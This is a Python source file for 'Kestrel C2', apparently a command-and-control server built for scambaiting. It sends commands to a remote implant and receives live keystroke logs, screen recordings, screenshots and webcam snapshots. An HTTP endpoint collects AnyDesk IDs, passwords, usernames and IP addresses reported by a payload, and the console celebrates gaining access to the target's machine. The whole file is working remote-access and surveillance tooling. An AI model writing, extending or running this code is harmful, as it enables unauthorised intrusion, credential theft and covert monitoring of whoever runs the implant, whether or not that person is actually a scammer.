#!/usr/bin/env python3
"""
TCP Command Sender (Enhanced - Triple Purpose C2)
This program listens for incoming connections and sends commands to execute.
Now also receives HTTP reports from anytime payload and AnyDesk events from blackhole.
"""

import os
import socket
import sys
import json
import threading
import time
from datetime import datetime
from typing import Optional, Dict, Any
from tqdm import tqdm

# FastAPI imports
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.security import APIKeyHeader
from pydantic import BaseModel
import uvicorn

# Import from utils modules
from utils.config import DEFAULT_HOST, DEFAULT_PORT, BUFFER_SIZE, BINARY_START_MARKER, C2_API_KEY, FASTAPI_PORT
from utils.protocol import receive_text, receive_binary, peek_for_binary


# Ensure data directories exist
DATA_DIRS = [
    "data",
    "data/keylogs",
    "data/screenshots",
    "data/snapshots",
    "data/screenrecordings",
    "data/anytime_reports",
    "data/anydesk_events",
]

for dir_path in DATA_DIRS:
    os.makedirs(dir_path, exist_ok=True)


# ============================================================================
# CONSTANTS
# ============================================================================

# Timing delays (seconds)
FASTAPI_STARTUP_DELAY = 1  # Time to wait for FastAPI to initialize before starting TCP server


# ============================================================================
# FASTAPI APPLICATION
# ============================================================================

# Create FastAPI app
app = FastAPI(
    title="Kestrel C2 Server",
    description="Command & Control server for scambaiting operations",
    version="2.0.0",
)

# API Key security
api_key_header = APIKeyHeader(name="X-API-Key", auto_error=True)


def get_api_key(api_key: str = Depends(api_key_header)):
    """Validate API key from request header"""
    if api_key == C2_API_KEY:
        return api_key
    raise HTTPException(status_code=401, detail="Invalid API Key")


# Pydantic models for request validation
class AnyDeskEvent(BaseModel):
    """Model for AnyDesk connection events from Blackhole"""

    event_type: str
    anydesk_id: str
    ip_address: Optional[str] = None
    timestamp: str
    metadata: Dict[str, Any] = {}


class AnytimeReport(BaseModel):
    """Model for AnyDesk access reports from Anytime payload"""

    id: str
    password: str
    hostname: Optional[str] = None
    username: Optional[str] = None
    execution_time: Optional[str] = None
    os_version: Optional[str] = None
    timezone: Optional[str] = None
    timezone_offset: Optional[str] = None
    locale: Optional[str] = None
    local_ip: Optional[str] = None
    external_ip: Optional[str] = None


# ============================================================================
# FASTAPI ROUTES
# ============================================================================


@app.post("/anydesk_event")
async def anydesk_event(event: AnyDeskEvent, request: Request, api_key: str = Depends(get_api_key)):
    """Receive AnyDesk connection events from Blackhole"""
    log_anydesk_event(event.dict(), request.client.host)
    return {"status": "ok"}


@app.post("/report")
async def anytime_report(report: AnytimeReport, request: Request, api_key: str = Depends(get_api_key)):
    """Receive AnyDesk access reports from Anytime payload"""
    log_anytime_report(report.dict(), request.client.host)
    return {"status": "ok"}


# ============================================================================
# LOGGING FUNCTIONS
# ============================================================================


def log_anydesk_event(data: dict, remote_addr: str):
    """Log AnyDesk connection event to files and display in console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Extract event data
    event_type = data.get("event_type", "UNKNOWN")
    anydesk_id = data.get("anydesk_id", "N/A")
    ip_address = data.get("ip_address", "N/A")
    event_timestamp = data.get("timestamp", timestamp)
    metadata = data.get("metadata", {})

    # Append to JSON Lines log (one event per line)
    today = datetime.now().strftime("%Y%m%d")
    jsonl_file = f"data/anydesk_events/events_{today}.jsonl"
    with open(jsonl_file, "a") as f:
        event_record = {
            "logged_at": timestamp,
            "event_timestamp": event_timestamp,
            "event_type": event_type,
            "anydesk_id": anydesk_id,
            "ip_address": ip_address,
            "metadata": metadata,
            "source_ip": remote_addr,
        }
        f.write(json.dumps(event_record) + "\n")

    # Append to master log (human-readable)
    with open("data/anydesk_events/master_log.txt", "a") as f:
        f.write(f"\n[{timestamp}] {event_type.upper()}\n")
        f.write(f"  AnyDesk ID:  {anydesk_id}\n")
        f.write(f"  IP Address:  {ip_address}\n")
        f.write(f"  Timestamp:   {event_timestamp}\n")
        if metadata:
            f.write(f"  Metadata:    {json.dumps(metadata)}\n")
        f.write(f"  Source:      {remote_addr}\n")
        f.write(f"-" * 60 + "\n")

    # Display in console based on event type
    if event_type == "incoming_request":
        print(f"\n{'='*70}")
        print(f"🚨 INCOMING CONNECTION REQUEST")
        print(f"{'='*70}")
        print(f"  AnyDesk ID:  \033[1;33m{anydesk_id}\033[0m")
        print(f"  IP Address:  \033[1;33m{ip_address}\033[0m")
        print(f"  Timestamp:   {event_timestamp}")
        if metadata.get("reverse_connection_initiated"):
            print(f"  \033[1;32m✓ Reverse connection initiated\033[0m")
        if metadata.get("firewall_auto_enabled"):
            print(f"  \033[1;32m✓ Firewall auto-enabled\033[0m")
        print(f"{'='*70}\n")

    elif event_type == "outgoing_accepted":
        print(f"\n{'='*70}")
        print(f"🎯 SUCCESS! REVERSE CONNECTION ACCEPTED")
        print(f"{'='*70}")
        print(f"  Target:      \033[1;32m{anydesk_id}\033[0m")
        print(f"  Timestamp:   {event_timestamp}")
        print(f"  \033[1;32mYOU NOW HAVE ACCESS TO SCAMMER'S MACHINE!\033[0m")
        print(f"{'='*70}\n")

    elif event_type == "outgoing_rejected":
        attempt = metadata.get("attempt_number", "N/A")
        print(f"\n{'='*70}")
        print(f"❌ REVERSE CONNECTION REJECTED")
        print(f"{'='*70}")
        print(f"  Target:      {anydesk_id}")
        print(f"  Attempt:     {attempt}")
        print(f"  Timestamp:   {event_timestamp}")
        print(f"{'='*70}\n")

    else:
        # Generic event display
        print(f"\n[ANYDESK EVENT] {event_type}: {anydesk_id} @ {ip_address}")


def log_anytime_report(data: dict, remote_addr: str):
    """Log AnyDesk access report to files and display in console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Extract all fields from report
    anydesk_id = data.get("id", "UNKNOWN")
    password = data.get("password", "UNKNOWN")
    hostname = data.get("hostname", "UNKNOWN")
    username = data.get("username", "UNKNOWN")
    execution_time = data.get("execution_time", "N/A")
    os_version = data.get("os_version", "N/A")
    timezone = data.get("timezone", "N/A")
    timezone_offset = data.get("timezone_offset", "N/A")
    locale = data.get("locale", "N/A")
    local_ip = data.get("local_ip", "N/A")
    external_ip = data.get("external_ip", "N/A")

    # Build complete report object
    report = {
        "timestamp": timestamp,
        "anydesk_id": anydesk_id,
        "password": password,
        "hostname": hostname,
        "username": username,
        "os_version": os_version,
        "timezone": timezone,
        "timezone_offset": timezone_offset,
        "locale": locale,
        "local_ip": local_ip,
        "external_ip": external_ip,
        "execution_time": execution_time,
        "source_ip": remote_addr,
    }

    # Save individual JSON report
    report_filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    report_file = f"data/anytime_reports/{report_filename}"
    with open(report_file, "w") as f:
        json.dump(report, f, indent=2)

    # Append to master log
    with open("data/anytime_reports/master_log.txt", "a") as f:
        f.write(f"\n{'='*70}\n")
        f.write(f"[{timestamp}] NEW ANYDESK ACCESS\n")
        f.write(f"{'='*70}\n")
        f.write(f"AnyDesk ID:  {anydesk_id}\n")
        f.write(f"Password:    {password}\n")
        f.write(f"\n")
        f.write(f"SYSTEM:\n")
        f.write(f"  Hostname:    {hostname}\n")
        f.write(f"  Username:    {username}\n")
        f.write(f"  OS:          {os_version}\n")
        f.write(f"\n")
        f.write(f"LOCATION:\n")
        f.write(f"  Timezone:    {timezone} (UTC{timezone_offset})\n")
        f.write(f"  Locale:      {locale}\n")
        f.write(f"  Local IP:    {local_ip}\n")
        f.write(f"  External IP: {external_ip}\n")
        f.write(f"\n")
        f.write(f"PERFORMANCE:\n")
        f.write(f"  Exec Time:   {execution_time}s\n")
        f.write(f"  Source IP:   {remote_addr}\n")
        f.write(f"\n")

    # Display prominently in console
    print(f"\n{'='*70}")
    print(f"🎯 NEW ANYDESK ACCESS REPORTED!")
    print(f"{'='*70}")
    print(f"  AnyDesk ID:  \033[1;32m{anydesk_id}\033[0m")
    print(f"  Password:    \033[1;32m{password}\033[0m")
    print(f"")
    print(f"  SYSTEM:")
    print(f"    Hostname:    {hostname}")
    print(f"    Username:    {username}")
    print(f"    OS:          {os_version}")
    print(f"")
    print(f"  LOCATION:")
    print(f"    Timezone:    {timezone} (UTC{timezone_offset})")
    print(f"    Locale:      {locale}")
    print(f"    Local IP:    {local_ip}")
    print(f"    External IP: {external_ip}")
    print(f"")
    print(f"  PERFORMANCE:")
    print(f"    Exec Time:   {execution_time}s")
    print(f"    Source IP:   {remote_addr}")
    print(f"{'='*70}")
    print(f"  Saved to: {report_file}")
    print(f"{'='*70}\n")


# ============================================================================
# TCP COMMAND HANDLER
# ============================================================================


def handle_keylog_stream(client_socket):
    """
    Handle keylogger streaming mode.
    Receives keystrokes in real-time and writes to file.
    Non-blocking: Press Enter to send /stop command.
    """
    # Receive start marker with timestamp
    data = receive_text(client_socket)
    if not data.startswith("<KEYLOG_START>"):
        print(f"[Unexpected keylog response: {data}]")
        return

    timestamp = data.replace("<KEYLOG_START>", "").strip()
    filename = f"data/keylogs/keylog_{timestamp}.txt"

    print(f"[Keylogger started - saving to {filename}]")
    print("[Press Enter to send /stop command]")
    print("-" * 60)

    # Flag to signal stop
    stop_requested = threading.Event()

    def input_thread():
        """Wait for user to press Enter"""
        try:
            input()  # Wait for Enter
            stop_requested.set()
        except:
            pass

    # Start input thread
    threading.Thread(target=input_thread, daemon=True).start()

    # Open file for writing
    with open(filename, "w", encoding="utf-8") as f:
        buffer = b""

        # Set socket timeout for non-blocking receive
        client_socket.settimeout(0.1)

        while not stop_requested.is_set():
            try:
                # Receive data with timeout
                chunk = client_socket.recv(BUFFER_SIZE)
                if not chunk:
                    print("\n[Connection lost]")
                    break

                buffer += chunk

                # Check for end marker
                if b"<KEYLOG_END>" in buffer:
                    # Extract any remaining keystrokes before end marker
                    remaining = buffer.split(b"<KEYLOG_END>")[0]
                    if remaining:
                        text = remaining.decode("utf-8", errors="replace")
                        sys.stdout.write(text)
                        sys.stdout.flush()
                        f.write(text)

                    # Receive the final text response
                    client_socket.settimeout(None)  # Reset timeout
                    receive_text(client_socket)
                    break

                # Process available data
                try:
                    text = buffer.decode("utf-8", errors="replace")
                    buffer = b""  # Clear buffer after successful decode

                    # Display and save keystroke
                    sys.stdout.write(text)
                    sys.stdout.flush()
                    f.write(text)

                except UnicodeDecodeError:
                    # Incomplete UTF-8 sequence, wait for more data
                    pass

            except socket.timeout:
                # Timeout - check if stop requested
                continue
            except KeyboardInterrupt:
                print("\n[Interrupted - stopping keylogger]")
                stop_requested.set()
                break

        # Reset socket timeout
        client_socket.settimeout(None)

        # If user requested stop, send /stop command
        if stop_requested.is_set() and not b"<KEYLOG_END>" in buffer:
            print("\n[Sending /stop command...]")
            client_socket.sendall(b"/stop")
            # Wait for confirmation
            try:
                receive_text(client_socket)
            except:
                pass

    print(f"\n[Keylog saved to {filename}]")


def handle_screenrecord_stream(client_socket):
    """
    Handle screen recording frame streaming.
    Receives frames and builds video using cv2.VideoWriter.
    """
    try:
        import cv2
        import numpy as np
    except ImportError:
        print("[ERROR: opencv-python not installed. Run: pip install opencv-python]")
        receive_text(client_socket)  # Consume error message
        return

    # Receive start marker with metadata
    data = receive_text(client_socket)
    if not data.startswith("<RECORDING_START>"):
        print(f"[Unexpected recording response: {data}]")
        return

    metadata = data.replace("<RECORDING_START>", "").strip()
    resolution, fps, timestamp = metadata.split("|")
    width, height = map(int, resolution.split("x"))
    fps = int(fps)

    filename = f"data/screenrecordings/recording_{timestamp}.mp4"

    print(f"[Screen recording started: {width}x{height} @ {fps} FPS]")
    print(f"[Saving to {filename}]")
    print("[Press Enter to send /stop command]")
    print()

    # Flag to signal stop
    stop_requested = threading.Event()

    def input_thread():
        """Wait for user to press Enter"""
        try:
            input()  # Wait for Enter
            stop_requested.set()
        except:
            pass

    # Start input thread
    threading.Thread(target=input_thread, daemon=True).start()

    # Setup video writer
    # Try H264 first, fallback to mp4v
    fourcc_options = [
        ("avc1", "H264"),
        ("H264", "H264"),
        ("mp4v", "MPEG-4"),
    ]

    out = None
    for fourcc_code, codec_name in fourcc_options:
        try:
            fourcc = cv2.VideoWriter_fourcc(*fourcc_code)
            out = cv2.VideoWriter(filename, fourcc, fps, (width, height))
            if out.isOpened():
                print(f"[Using codec: {codec_name}]")
                break
            else:
                print(f"[Codec {codec_name} ({fourcc_code}) not available, trying next...]")
            out.release()
            out = None
        except Exception as e:
            print(f"[Codec {codec_name} ({fourcc_code}) failed: {e}]")
            continue

    if out is None:
        print("[ERROR: Could not initialize video writer]")
        # Consume remaining frames
        while True:
            try:
                if peek_for_binary(client_socket):
                    receive_binary(client_socket)
                else:
                    receive_text(client_socket)
                    break
            except:
                break
        return

    frame_count = 0

    try:
        with tqdm(desc="Recording", unit="frames") as pbar:
            while not stop_requested.is_set():
                # Check if next data is binary (frame) or text (end marker)
                # Timeout must be longer than frame interval (1/fps = 0.2s at 5fps)
                # Use 0.5s to be safe
                if peek_for_binary(client_socket, timeout=0.5):
                    # Receive frame
                    frame_name, frame_data = receive_binary(client_socket)

                    # Decode JPEG frame
                    nparr = np.frombuffer(frame_data, np.uint8)
                    frame = cv2.imdecode(nparr, cv2.IMREAD_COLOR)

                    if frame is not None:
                        # Write to video
                        out.write(frame)
                        frame_count += 1
                        pbar.update(1)
                    else:
                        print(f"\n[Warning: Failed to decode frame {frame_count}]")
                else:
                    # Check for end marker
                    try:
                        client_socket.settimeout(0.1)
                        data = receive_text(client_socket)
                        client_socket.settimeout(None)
                        if "<RECORDING_END>" in data:
                            break
                    except socket.timeout:
                        # No data yet, check stop flag again
                        continue
                    except:
                        break

            # If user requested stop, send /stop command
            if stop_requested.is_set():
                print("\n[Sending /stop command...]")
                client_socket.sendall(b"/stop")
                # Wait for confirmation
                try:
                    receive_text(client_socket)
                except:
                    pass

    except KeyboardInterrupt:
        print("\n[Interrupted - stopping recording]")
        try:
            client_socket.sendall(b"/stop")
            receive_text(client_socket)
        except:
            pass
    except Exception as e:
        print(f"\n[Recording error: {e}]")
    finally:
        out.release()

    print(f"\n[Recording complete: {filename}]")
    print(f"[Total frames: {frame_count}]")
    print(f"[Duration: {frame_count / fps:.1f} seconds]")


def handle_response(client_socket, command):
    """
    Handle response from receiver.
    Auto-detects binary vs text and routes to appropriate handler.
    """
    # Special handling for keylogger mode
    if command == "/keylogger":
        handle_keylog_stream(client_socket)
        return

    # Special handling for screen recording
    if command == "/screenrecord":
        handle_screenrecord_stream(client_socket)
        return

    # Check if response is binary
    if peek_for_binary(client_socket, timeout=0.5):
        # Receive binary data
        data_type, binary_data = receive_binary(client_socket)

        # Determine file path based on data type
        if data_type.startswith("ss_") or data_type.startswith("screenshot_"):
            filepath = f"data/screenshots/{data_type}"
        elif data_type.startswith("snap_") or data_type.startswith("snapshot_"):
            filepath = f"data/snapshots/{data_type}"
        else:
            # Generic binary file
            filepath = f"data/{data_type}"

        # Save binary data
        with open(filepath, "wb") as f:
            f.write(binary_data)

        print(f"[Saved: {filepath} ({len(binary_data):,} bytes)]")
        print()
    else:
        # Receive text response
        response = receive_text(client_socket)

        # Print response
        if response:
            print(response)
            if not response.endswith("\n"):
                print()


def start_fastapi_server():
    """Start FastAPI server with uvicorn"""
    uvicorn.run(app, host="0.0.0.0", port=FASTAPI_PORT, log_level="error", access_log=False)


def start_tcp_sender(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT) -> None:
    """
    Start the TCP command sender server.

    Args:
        host: The host address to bind to (0.0.0.0 means all available interfaces)
        port: The port number to listen on
    """
    # Create a TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Allow reuse of address to avoid "Address already in use" errors
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        # Bind the socket to the host and port
        server_socket.bind((host, port))

        # Listen for incoming connections (backlog of 1)
        server_socket.listen(1)

        print(f"Listening on {host}:{port}")
        print("Waiting for client to connect...\n")

        # Main server loop - accept multiple clients sequentially
        while True:
            # Accept a connection
            client_socket, client_address = server_socket.accept()
            print(f"Connected: {client_address[0]}:{client_address[1]}")
            print("Type /help for available commands\n")

            # Continuously read user input and send commands
            try:
                while True:
                    try:
                        # Get command from user
                        command = input("command> ")

                        # Skip empty commands
                        if not command.strip():
                            continue

                        # Send the command
                        client_socket.sendall(command.encode("utf-8"))
                        print()

                        # Handle response
                        handle_response(client_socket, command)

                    except KeyboardInterrupt:
                        print("\n\nExiting...")
                        raise  # Re-raise to exit server loop
                    except BrokenPipeError:
                        print("\nConnection closed by receiver")
                        break
                    except Exception as e:
                        print(f"\nError: {e}")
                        break

            finally:
                # Clean up client connection
                client_socket.close()
                print("\nWaiting for next client to connect...\n")

    except KeyboardInterrupt:
        print("\n\nExiting...")
    except OSError as e:
        print(f"Socket error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)
    finally:
        server_socket.close()


if __name__ == "__main__":
    print("\n[ Enhanced C2 Server - Triple Purpose ]\n")
    print("Modes:")
    print("  1. TCP Server   (port 5555) - receiver.py connections")
    print("  2. FastAPI HTTP (port 8080) - anytime reports + AnyDesk events")
    print()
    print("FastAPI Features:")
    print("  • POST /report - Anytime payload reports")
    print("  • POST /anydesk_event - Blackhole AnyDesk events")
    print("  • API Key authentication (X-API-Key header)")
    print(f"  • Interactive docs: http://localhost:{FASTAPI_PORT}/docs")
    print()

    # Start FastAPI server in background thread
    fastapi_thread = threading.Thread(target=start_fastapi_server, daemon=True, name="FastAPI")
    fastapi_thread.start()
    print(f"[FastAPI] Starting on port {FASTAPI_PORT}...")

    # Give FastAPI time to start
    time.sleep(FASTAPI_STARTUP_DELAY)

    # Start TCP server in main thread
    print("[ TCP Server Starting... ]\n")
    start_tcp_sender(DEFAULT_HOST, DEFAULT_PORT)
